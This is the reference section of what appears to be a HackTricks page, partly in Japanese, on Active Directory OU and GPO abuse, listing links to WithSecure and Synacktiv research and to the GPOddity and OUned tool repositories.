- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: Active Directory における隠れた Organizational Unit の ACL 攻撃ベクトルの悪用](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [ネットワーク上で正規の Active Directory サービスをシミュレートする: GPO 悪用の事例](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
